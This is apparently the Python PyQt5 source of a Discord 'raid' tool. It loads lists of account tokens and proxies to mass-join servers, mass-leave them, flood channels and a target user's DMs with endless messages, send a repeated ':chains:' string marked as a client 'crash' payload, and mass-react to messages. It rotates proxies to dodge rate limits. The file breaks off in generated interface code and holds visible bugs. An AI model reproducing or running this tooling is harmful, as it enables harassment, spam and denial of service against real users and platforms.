# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'final.ui'
#
# Created by: PyQt5 UI code generator 5.13.2
#
# WARNING! All changes made in this file will be lost!

from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import QSettings
from PyQt5.QtWidgets import QWidget, QMainWindow     
from datetime import datetime
import requests 
import time
import sys
import threading 
import subprocess
SpamFrameUseRequests = False
LeaveFrameUseProxies = False
userToken = []
proxy_list = []
leavethreadingpool = []
jointhreadingpool = []
JoinProxy = False
leaveprocesses = []
SpamThreadingPool = []
SpamProccesses = []
DMProccesses = []
stop_threads = False
global ui




class NarrativeMainFrame(QMainWindow):
    
    def __init__(self):
        super(NarrativeMainFrame, self).__init__()
        self.setupUi(self)
        self.Console = QtWidgets.QMainWindow()
        self.SecondSetup(self.Console)
        self.settings = QSettings('NarrativeDarkMode', 'Narrative')
        #self.Console.SetConsoleText('Successfully wrote')
        try:
            self.PythonInterpInputBox.setText(self.settings.value('pythoninput'))
        except:
            pass


    def closeEvent(self, event):
        self.settings.setValue('pythoninput', self.PythonInterpInputBox.text())
    
    
    #Helper functions to initiate the proper functions defined throughout
    def JoinServer(self, invite, token, proxy_number, delay):
        url = 'https://discord.com/api/v9/invite/'+invite+'?with_counts=true'
        header = {"content-type": "application/json", "Authorization": token }
        proxy = { 'http' : proxy_number}
        req = requests.post(url,headers=header, proxies=proxy)
        if req.status_code == 200:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_number} -> TOKEN: {token} -> Successfully Joined")
        elif req.status_code == 429:
            retry = req.headers['Retry-After']
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_number} -> TOKEN: {token} -> ERROR: {req.status_code} Retry after {retry} seconds")
        else:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_number} -> TOKEN: {token} -> ERROR: {req.status_code} {req.reason}")


    def ReqLeaveServer(self, Guild, token, proxy_number, delay):
        url = 'https://discord.com/api/v9/users/@me/guilds/' + Guild
        header = {"json": "false", "Authorization": token }
        proxy = { 'http' : proxy_number}
        req = requests.delete(url,headers=header, proxies=proxy)
        if req.status_code == 200 or 204:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_number} -> TOKEN: {token} -> Successfully left")
        else:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_number} -> TOKEN: {token} -> ERROR: {req.status_code} {req.reason}")
        

    def ReqSpamServer(self, text, token, channel, proxie, delay):
        now = datetime.now()
        dt_string = now.strftime("%H:%M:%S")
        self.SetConsoleText(f"[{dt_string}] PROXY: {proxie} -> TOKEN: {token} -> Started Request Spammer")
        proxy = { 'http' : proxie}
        url = 'https://discord.com/api/v6/channels/{0}/messages'.format(channel)
        header = {"content-type": "application/json", "Authorization": token }
        paymoneywubby = {"content": text, "tts": "false"}
        while True:
            global stop_threads
            if stop_threads:
                break
            req = requests.post(url,headers=header, json=paymoneywubby, proxies=proxy)
            if req.status_code == 429:
                retry = req.headers['Retry-After']
                now = datetime.now()
                dt_string = now.strftime("%H:%M:%S")
                self.SetConsoleText(f"[{dt_string}] PROXY: {proxie} -> TOKEN: {token} -> Retry after {retry} seconds")
            elif req.status_code == 200:
                continue
            else:
                now = datetime.now()
                dt_string = now.strftime("%H:%M:%S")
                self.SetConsoleText(f"[{dt_string}] PROXY: {proxie} -> TOKEN: {token} -> ERROR: {req.status_code} {req.reason}")
                break


    def ReactMessage(self, url, token, proxy_num):
        NarrativeMainFrame = NarrativeMainFrame()
        proxy = { 'http' : proxy_num}
        header = {"content-type": "application/json", "Authorization": token }

        req = requests.put(url,headers=header, proxies=proxy)
        if req.status_code == 204:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_num} -> TOKEN: {token} -> Successful React")
        else:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] PROXY: {proxy_num} -> TOKEN: {token} -> ERROR: {req.status_code} {req.reason}")
                

    def get_proxylist(self, proxy_directory):
        try:
            proxy_list = []
            proxy_list = open(proxy_directory).read().splitlines()
            count = len(proxy_list)
            self.ProxyCountLabel.setText(f"Total Proxy Count: {count}")
            return proxy_list
        except:
            for _ in range(10000):
                proxy_list.append('localhost')
            return proxy_list


    def StopSpamServer(self):
        global stop_threads
        stop_threads = True
        for thread in SpamThreadingPool:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] Stopping {thread}")
            thread.join()
        for Process in SpamProccesses:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] Stopping {Process}")
            Process.kill()

    def DmSpamStop(self):
        for Processes in DMProccesses:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] Stopping {Processes}")
            Processes.kill()


    def StartSpamServer(self):
        global stop_threads
        stop_threads = False
        proxy_number = 0
        global SpamThreadingPool
        global SpamProccesses
        SpamThreadingPool = []
        SpamProccesses = []
        tokens = self.get_tokens(self.TokenFrameDirectory.text())
        proxies = self.get_proxylist(self.ProxyFrameDirectory.text())
        delay = int(self.JoinDelaySlider.value())
        milidelay = float(delay / 100)
        channel = self.SpamFrameChannelInput.text()
        if self.SpamFrameRequestCheckBox.isChecked():
            if self.SpamFrameCrashCheckBox.isChecked():
                text = ":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains: :chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains: :chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains: :chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:"
                try:
                    for token in tokens:
                        LTT = threading.Thread(target=self.ReqSpamServer, args=(text, token, channel, proxies[proxy_number], str(milidelay)))
                        LTT.start()
                        SpamThreadingPool.append(LTT)
                        proxy_number += 1
                        time.sleep(miliday)
                except:
                    if tokens is None:
                        pass
                    elif channel == '':
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] You need to specify a discord channel!")
                    else:
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")
            else:
                try:
                    for token in tokens:
                        LTT = threading.Thread(target=self.ReqSpamServer, args=(self.SpamFrameSpamTextBox.toPlainText(), token, channel, proxies[proxy_number], str(milidelay)))
                        LTT.start()
                        SpamThreadingPool.append(LTT)
                        proxy_number += 1
                        time.sleep(miliday)
                except:
                    if tokens is None:
                        pass
                    elif channel == '':
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] You need to specify a discord channel!")
                    else:
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")
        else:
            if self.SpamFrameCrashCheckBox.isChecked():
                try:
                    for token in tokens:
                        p = subprocess.Popen([self.PythonInterpInputBox.text(), 'Source/crash.py',token, channel, str(milidelay)])
                        SpamProccesses.append(p)
                except:
                    if tokens is None:
                        pass
                    elif channel == '':
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] You need to specify a discord channel!")
                    else:
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")
            else:
                try:
                    for token in tokens:
                        p = subprocess.Popen([self.PythonInterpInputBox.text(),'Source/text.py', token, self.SpamFrameSpamTextBox.toPlainText(), channel, str(milidelay)])
                        SpamProccesses.append(p)
                except:
                    if tokens is None:
                        pass
                    elif channel == '':
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] You need to specify a discord channel!")
                    else:
                        now = datetime.now()
                        dt_string = now.strftime("%H:%M:%S")
                        self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")


    def DmSpamStart(self):
        proxy_number = 0
        global DMProccesses
        DMProccesses = []
        tokens = self.get_tokens(self.TokenFrameDirectory.text())
        proxies = self.get_proxylist(self.ProxyFrameDirectory.text())
        delay = int(self.DMDelaySlider.value())
        milidelay = float(delay / 10)
        user = self.DMFrameUserInput.text()
        text = self.DMFrameSpamTextBox.toPlainText()
        if self.DMFrameCrashCheckBox.isChecked():
            try:
                for token in tokens:
                    p = subprocess.Popen([self.PythonInterpInputBox.text(), 'Source/dmcrash.py',token, user, str(milidelay)])
                    DMProccesses.append(p)
            except:
                if tokens is None:
                    pass
                elif user == '':
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] You need to specify a discord user!")
                elif text == '':
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] You need to input some text!")
                else:
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")
        else:
            try:
                for token in tokens:
                    p = subprocess.Popen([self.PythonInterpInputBox.text(), 'Source/dm.py',token, user, str(milidelay), text])
                    DMProccesses.append(p)
            except:
                if tokens is None:
                    pass
                elif user == '':
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] You need to specify a discord user!")
                elif text == '':
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] You need to input some text!")
                else:
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")


                    

    def LeaveServerStart(self):
        proxy_number = 0
        leavethreadingpool = []
        leaveprocesses = []
        tokens = self.get_tokens(self.TokenFrameDirectory.text())
        proxies = self.get_proxylist(self.ProxyFrameDirectory.text())
        if self.LeaveRequestsCheckBox.isChecked():
            try:
                for token in tokens:
                    L = threading.Thread(target=self.ReqLeaveServer,args=(self.LeaveFrameInput.text(), token, proxies[proxy_number], 0.1))
                    L.start()
                    leavethreadingpool.append(L)
                    proxy_number += 1
                    time.sleep(0.5)
            except:
                if tokens is None:
                    pass
                elif self.LeaveFrameInput.text() == '':
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] You need to specify a discord server!")
                else:
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.!")
        else:
            try:
                for token in tokens:
                    p = subprocess.Popen([self.PythonInterpInputBox.text(),'Source/leave.py',token, self.LeaveFrameInput.text()])
                    leaveprocesses.append(p)
            #for process in leaveprocesses:
                #process.kill()
            except:
                if tokens is None:
                    pass
                elif self.LeaveFrameInput.text() == '':
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] You need to specify a discord server!")
                else:
                    now = datetime.now()
                    dt_string = now.strftime("%H:%M:%S")
                    self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.!")        

    def ReactMessageStart(self):
        tokens = self.get_tokens(self.TokenFrameDirectory.text())
        proxies = self.get_proxylist(self.ProxyFrameDirectory.text())
        proxy_number = 0
        url = self.ReactFrameUrlTextBox.text()
        try:
            for token in tokens:
                RT = threading.Thread(target=self.ReactMessage,args=(url, token, proxies[proxy_number]))
                RT.start()
                proxy_number +=1
        except:
            if tokens is None:
                pass
            elif url == '':
                now = datetime.now()
                dt_string = now.strftime("%H:%M:%S")
                self.SetConsoleText(f"[{dt_string}] You need to specify an api react link!")
            else:
                now = datetime.now()
                dt_string = now.strftime("%H:%M:%S")
                self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")



    def JoinServerStart(self):
        proxy_number = 0
        jointhreadingpool = []
        tokens = self.get_tokens(self.TokenFrameDirectory.text())
        proxies = self.get_proxylist(self.ProxyFrameDirectory.text())
        delay = int(self.JoinDelaySlider.value())
        milidelay = float(delay / 10)
        invite = ''
        try:
            invite = self.JoinFrameInput.text().split("https://discord.gg/",1)[1] 
            for token in tokens:
                t = threading.Thread(target=self.JoinServer,args=(invite, token, proxies[proxy_number], milidelay))
                t.start()
                jointhreadingpool.append(t)
                proxy_number += 1
                time.sleep(milidelay)
        # Honestly this only waits for the threads to finish and it freezes the processes SOOOOOOO Del
        #for thread in jointhreadingpool:
            #thread.join()
        except:
            if tokens is None:
                pass
            elif invite == '':
                now = datetime.now()
                dt_string = now.strftime("%H:%M:%S")
                self.SetConsoleText(f"[{dt_string}] You need to specify a discord server!")
            else:
                now = datetime.now()
                dt_string = now.strftime("%H:%M:%S")
                self.SetConsoleText(f"[{dt_string}] Something happened... most likely user error.")

    def get_tokens(self, token_directory):
        try:
            userToken = []
            userToken = open(token_directory).read().splitlines()
            tokencount = len(userToken)
            self.TokenFrameCountLabel.setText(f"Current Amount of Tokens Loaded: {tokencount}")
            return userToken
        except:
            now = datetime.now()
            dt_string = now.strftime("%H:%M:%S")
            self.SetConsoleText(f"[{dt_string}] You need to import your tokens list before you can start!")

    def fileopen(self):
        dialog = QtWidgets.QFileDialog()
        dialog.setViewMode(QtWidgets.QFileDialog.Detail)

        if dialog.exec_():
            filenames = dialog.selectedFiles()
            self.ProxyFrameDirectory.setText(filenames[0]) 

    def tokenfileopen(self):
        dialog = QtWidgets.QFileDialog()
        dialog.setViewMode(QtWidgets.QFileDialog.Detail)

        if dialog.exec_():
            filenames = dialog.selectedFiles()
            self.TokenFrameDirectory.setText(filenames[0])



    def SpamDelaySliderChangeValue(self, value):
        self.DelayLabel_3.setText(f"Delay: {value*100 + 100}ms")

    def JoinSliderChangeValue(self, value):
        self.JoinDelayLabel.setText(f"Delay: {value*100 + 100}ms")

    def DMDelaySliderChangeValue(self, value):
        self.DelayLabel_4.setText(f"Delay: {value*100 + 100}ms")


    #Gui Setup From here on out ------------------------------------------
    def SecondSetup(self, Console):
        palette = QtGui.QPalette()
        brush = QtGui.QBrush(QtGui.QColor(24, 24, 24))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(24, 24, 24))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(46, 52, 64))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
        Console.setPalette(palette)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("NT.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        Console.setWindowIcon(icon)
        self.ConsoleLogging = QtWidgets.QTextBrowser(Console)
        self.ConsoleLogging.setGeometry(QtCore.QRect(0, 0, 1241, 351))
        palette = QtGui.QPalette()
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(28, 33, 40))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Light, brush)
        brush = QtGui.QBrush(QtGui.QColor(23, 27, 33))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(12, 14, 18))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.BrightText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(24, 24, 24))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ToolTipBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ToolTipText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(28, 33, 40))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Light, brush)
        brush = QtGui.QBrush(QtGui.QColor(23, 27, 33))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(12, 14, 18))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.BrightText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(24, 24, 24))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ToolTipBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ToolTipText, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(28, 33, 40))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Light, brush)
        brush = QtGui.QBrush(QtGui.QColor(23, 27, 33))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(12, 14, 18))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.BrightText, brush)
        brush = QtGui.QBrush(QtGui.QColor(9, 11, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(19, 22, 27))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ToolTipBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ToolTipText, brush)
        Console.setObjectName("Console")
        Console.resize(560, 310) # 820 530
        self.centralwidget = QtWidgets.QWidget(Console)
        self.centralwidget.setObjectName("centralwidget")
        Console.setCentralWidget(self.centralwidget)

        self.groupBox_2 = QtWidgets.QGroupBox("groupBox_2", self.centralwidget)

        self.output_rd = QtWidgets.QTextBrowser(self.groupBox_2)
        self.output_rd.setGeometry(QtCore.QRect(0, 0, 561, 311))
        self.output_rd.setObjectName("output_rd")

        self.ConsoleretranslateUi(Console)


    
    
    def setupUi(self, NarrativeMainFrame):
        #print(self.settings.fileName())
        #self.PythonInterpInputBox.setText(self.settings.value('pythoninput'))
        palette = QtGui.QPalette()
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(39, 39, 39))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Light, brush)
        brush = QtGui.QBrush(QtGui.QColor(32, 32, 32))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(17, 17, 17))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.BrightText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(76, 86, 106))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.Highlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.NoRole, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ToolTipBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ToolTipText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
